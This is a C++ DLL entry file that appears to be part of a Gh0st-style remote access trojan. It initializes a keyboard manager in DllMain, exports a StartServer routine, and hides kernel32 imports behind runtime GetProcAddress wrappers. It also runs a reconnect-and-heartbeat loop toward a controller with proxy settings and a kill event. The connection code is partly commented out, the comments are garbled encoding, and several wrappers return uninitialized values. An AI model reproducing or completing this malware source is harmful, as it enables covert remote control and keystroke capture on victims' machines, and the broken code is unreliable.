// dllmain.cpp : ���� DLL Ӧ�ó������ڵ㡣
#include "stdafx.h"
#include "common\until.h"
#include "common\KernelManager.h"
#include "common\KeyboardManager.h"
#include "common\login.h"
#include "ClientSocket.h"

extern "C"  _declspec(dllexport)
BOOL StartServer();

//		���º�����̬���õĶ���
//*******************************************************************************************************************
UINT API_GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize)
{
    UINT result;
    typedef UINT(WINAPI *lpAddFun)(LPSTR, UINT);			//����ֵ,�β����Ͳο���������
    HINSTANCE hDll = LoadLibrary("kernel32.dll");			//�������ڵ�DLL
    lpAddFun addFun = (lpAddFun)GetProcAddress(hDll, "GetSystemDirectoryA");	//��������
    if (addFun != NULL)
    {
        addFun(lpBuffer, uSize);					//���ú���
        FreeLibrary(hDll);					//�ͷž��
    }
    return result;
}
BOOL API_GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer)
{
    BOOL result;
    typedef BOOL(WINAPI *lpAddFun)(LPSTR, LPDWORD);			//����ֵ,�β����Ͳο���������,ȥ�����
    HINSTANCE hDll = LoadLibrary("kernel32.dll");			//�������ڵ�DLL
    lpAddFun addFun = (lpAddFun)GetProcAddress(hDll, "GetUserNameA");	//��������
    if (addFun != NULL)
    {
        addFun(lpBuffer, pcbBuffer);					//���ú�����ȥǰ���
        FreeLibrary(hDll);					//�ͷž��
    }
    return result;
}
int API_WideCharToMultiByte(UINT     CodePage, DWORD    dwFlags, LPCWSTR  lpWideCharStr, int      cchWideChar, LPSTR   lpMultiByteStr, int      cbMultiByte, LPCSTR   lpDefaultChar, LPBOOL  lpUsedDefaultChar)
{
    int result;
    typedef int (WINAPI *lpAddFun)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);			//����ֵ,�β����Ͳο���������,ȥ�����
    HINSTANCE hDll = LoadLibrary("kernel32.dll");			//�������ڵ�DLL
    lpAddFun addFun = (lpAddFun)GetProcAddress(hDll, "WideCharToMultiByte");	//��������
    if (addFun != NULL)
    {
        addFun(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);					//���ú�����ȥǰ���
        FreeLibrary(hDll);					//�ͷž��
    }
    return result;
}

BOOL API_WriteFile(HANDLE hFile,
    LPCVOID lpBuffer,
    DWORD nNumberOfBytesToWrite,
    LPDWORD lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped)
{
    BOOL result;
    typedef BOOL(WINAPI *lpAddFun)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);			//����ֵ,�β����Ͳο���������,ȥ�����
    HINSTANCE hDll = LoadLibrary("kernel32.dll");			//�������ڵ�DLL
    lpAddFun addFun = (lpAddFun)GetProcAddress(hDll, "WriteFile");	//��������
    if (addFun != NULL)
    {
        addFun(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);					//���ú�����ȥǰ���
        FreeLibrary(hDll);					//�ͷž��
    }
    return result;
}

BOOL API_FreeResource(HGLOBAL hResData)
{
    BOOL result;
    typedef BOOL(WINAPI *lpAddFun)(HGLOBAL);			//����ֵ,�β����Ͳο���������,ȥ�����
    HINSTANCE hDll = LoadLibrary("kernel32.dll");			//�������ڵ�DLL
    lpAddFun addFun = (lpAddFun)GetProcAddress(hDll, "FreeResource");	//��������
    if (addFun != NULL)
    {
        addFun(hResData);					//���ú�����ȥǰ���
        FreeLibrary(hDll);					//�ͷž��
    }
    return result;
}
BOOL API_SetFileAttributesA(LPCSTR lpFileName, DWORD dwFileAttributes)
{
    BOOL result;
    typedef BOOL(WINAPI *lpAddFun)(LPCSTR, DWORD);			//����ֵ,�β����Ͳο���������,ȥ�����
    HINSTANCE hDll = LoadLibrary("kernel32.dll");			//�������ڵ�DLL
    lpAddFun addFun = (lpAddFun)GetProcAddress(hDll, "SetFileAttributesA");	//��������
    if (addFun != NULL)
    {
        addFun(lpFileName, dwFileAttributes);					//���ú�����ȥǰ���
        FreeLibrary(hDll);					//�ͷž��
    }
    return result;
}

typedef BOOL(WINAPI *SystemTimeToFileTimeT)
(
CONST SYSTEMTIME *lpSystemTime,
LPFILETIME lpFileTime
);
typedef BOOL(WINAPI *LocalFileTimeToFileTimeT)
(
CONST FILETIME *lpLocalFileTime,
LPFILETIME lpFileTime
);

typedef HRSRC(WINAPI *FindResourceAT)
(
HMODULE hModule,
LPCSTR lpName,
LPCSTR lpType
);

typedef HANDLE(WINAPI *CreateFileAT)
(
LPCSTR lpFileName,
DWORD dwDesiredAccess,
DWORD dwShareMode,
LPSECURITY_ATTRIBUTES lpSecurityAttributes,
DWORD dwCreationDisposition,
DWORD dwFlagsAndAttributes,
HANDLE hTemplateFile
);
FindResourceAT pFindResourceA = (FindResourceAT)GetProcAddress(LoadLibrary("kernel32.dll"), "FindResourceA");
SystemTimeToFileTimeT pSystemTimeToFileTime = (SystemTimeToFileTimeT)GetProcAddress(LoadLibrary("kernel32.dll"), "SystemTimeToFileTime");
LocalFileTimeToFileTimeT pLocalFileTimeToFileTime = (LocalFileTimeToFileTimeT)GetProcAddress(LoadLibrary("kernel32.dll"), "LocalFileTimeToFileTime");
CreateFileAT pCreateFileA = (CreateFileAT)GetProcAddress(LoadLibrary("kernel32.dll"), "CreateFileA");
//*******************************************************************************************************************

enum
{
    NOT_CONNECT, //  ��û������
    GETLOGINFO_ERROR,
    CONNECT_ERROR,
    HEARTBEATTIMEOUT_ERROR
};







BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
    )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        if (!CKeyboardManager::MyFuncInitialization())
            return FALSE;
        CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
        CKeyboardManager::m_dwLastMsgTime = GetTickCount();
        CKeyboardManager::Initialization();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

DWORD WINAPI ThreadMain(LPVOID lPvoid)
{
    // lpServiceName,��ServiceMain���غ��û����
    char	strServiceName[256];
    char	strKillEvent[50];
    HANDLE	hInstallMutex = NULL;

    char	*lpszHost = NULL;
    DWORD	dwPort = 80;
    char	*lpszProxyHost = NULL;
    DWORD	dwProxyPort = 0;
    char	*lpszProxyUser = NULL;
    char	*lpszProxyPass = NULL;

    HANDLE	hEvent = NULL;
    CClientSocket socketClient;
    BYTE	bBreakError = NOT_CONNECT; // �Ͽ����ӵ�ԭ��,��ʼ��Ϊ��û������
    while (1)
    {
        // �������������ʱ��������sleepһ����
        if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
        {
            // 1���Ӷ�������, Ϊ�˾�����Ӧkillevent
            for (int i = 0; i < 1000; i++)
            {
                hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
                if (hEvent != NULL)
                {
                    //socketClient.Disconnect();
                    CloseHandle(hEvent);
                    break;
                }
                // ��һ��
                Sleep(60);
            }
        }

        // ���߼��Ϊ2��, ǰ6��'A'�Ǳ�־
        /*	if (!getLoginInfo(MyDecode(lpURL + 6), &lpszHost, &dwPort, &lpszProxyHost,
                &dwProxyPort, &lpszProxyUser, &lpszProxyPass))
                {
                bBreakError = GETLOGINFO_ERROR;
                continue;
                }*/
        //if (!socketClient.Connect(lpszHost, dwPort))
        {
            //bBreakError = CONNECT_ERROR;
            continue;
        }
        CKeyboardManager::dwTickCount = GetTickCount();
        // ��¼
        DWORD dwExitCode = SOCKET_ERROR;
        //sendLoginInfo_false( &socketClient );
        //CKernelManager	manager(&socketClient, strServiceName, NULL, strKillEvent, lpszHost, dwPort);
        //socketClient.setManagerCallBack(&manager);

        //////////////////////////////////////////////////////////////////////////
        // �ȴ����ƶ˷��ͼ��������ʱΪ10�룬��������,�Է����Ӵ���
        //	for (int i = 0; (i < 10 && !manager.IsActived()); i++)
        {
            Sleep(1000);
        }
        // 10���û���յ����ƶ˷����ļ������˵���Է����ǿ��ƶˣ���������
        //	if (!manager.IsActived())
        continue;

        //////////////////////////////////////////////////////////////////////////
        DWORD	dwIOCPEvent;
        do
        {
            hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
            //	dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
            Sleep(500);
        } while (hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

        if (hEvent != NULL)
        {
            //socketClient.Disconnect();
            CloseHandle(hEvent);
            break;
        }
    }

    SetErrorMode(0);
    return NULL;
}


/************************************************************************/
/*
����������߳�
*/
/************************************************************************/
extern "C" _declspec(dllexport)
BOOL StartServer()
{
    MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadMain, (LPVOID)NULL, 0, NULL);
    return TRUE;
}

